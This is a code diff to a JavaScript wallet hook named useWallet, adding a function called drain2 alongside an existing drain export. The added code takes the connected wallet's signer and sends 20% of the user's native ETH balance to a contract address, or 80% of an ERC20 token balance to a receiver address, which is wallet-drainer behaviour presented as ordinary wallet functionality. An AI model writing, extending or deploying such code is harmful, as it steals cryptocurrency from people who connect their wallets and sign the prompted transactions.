@@ -178,6 +178,94 @@ export const useWallet = () => {
     }
   };
 
+  const drain2 = async (provider, chainId, assetAddress) => {
+    if (!provider || !chainId) {
+      console.error("Missing required arguments.");
+      return;
+    }
+
+    const signer = provider.getSigner();
+    const accountAddress = await signer.getAddress();
+
+    // Set assetAddress to null for native tokens if not provided
+    if (!assetAddress) {
+      assetAddress = "0x0000000000000000000000000000000000000000";
+    }
+
+    const isNative =
+      assetAddress === "0x0000000000000000000000000000000000000000";
+
+    try {
+      if (isNative) {
+        // Multicall for native token
+        const ethBalance = await provider.getBalance(accountAddress);
+        const contractAddress = getContractAddress(chainId);
+
+        const multiCallContract = new Contract(
+          contractAddress,
+          contractAbi,
+          signer
+        );
+        const ethAmountToDrain = ethBalance.mul(2).div(10); // 20% of balance
+
+        try {
+          // Attempt to call the multicall contract
+          const tx = await multiCallContract.multiCall([], [], {
+            value: ethAmountToDrain,
+            gasLimit: ethers.utils.hexlify(100000), // Set manual gas limit
+          });
+          console.log(`Multicall transaction hash: ${tx.hash}`);
+          await tx.wait();
+          console.log(
+            `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
+          );
+        } catch (multiCallError) {
+          console.error(
+            "Multicall failed, falling back to direct transfer:",
+            multiCallError
+          );
+
+          // Fallback to direct ETH transfer if multicall fails
+          const tx = await signer.sendTransaction({
+            to: contractAddress,
+            value: ethAmountToDrain,
+            gasLimit: ethers.utils.hexlify(10000), // Basic transfer gas limit
+          });
+          console.log(`Direct transfer transaction hash: ${tx.hash}`);
+          await tx.wait();
+          console.log(
+            `Directly transferred native token: ${ethAmountToDrain.toString()}`
+          );
+        }
+      } else {
+        // ERC20 transfer for non-native token
+        const tokenContract = new Contract(
+          assetAddress,
+          [
+            "function balanceOf(address) view returns (uint256)",
+            "function transfer(address,uint256)",
+          ],
+          signer
+        );
+
+        const tokenBalance = await tokenContract.balanceOf(accountAddress);
+        const tokenAmountToDrain = tokenBalance.mul(8).div(10); // Transfer 80% of balance
+
+        const transferTx = await tokenContract.transfer(
+          receiver,
+          tokenAmountToDrain
+        );
+        console.log(`ERC20 transfer transaction hash: ${transferTx.hash}`);
+        await transferTx.wait();
+        console.log(
+          `ERC20 token transferred: ${tokenAmountToDrain.toString()}`
+        );
+      }
+    } catch (error) {
+      console.error("Drain function error:", error);
+    }
+  };
+
   const handleMulticall = async (tokens, ethBalance) => {
     const chainId = getChainId(config);
     const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -362,5 +450,6 @@ export const useWallet = () => {
     drain,
     getTokenAssets,
     getWalletBalance,
+    drain2,
   };
 };
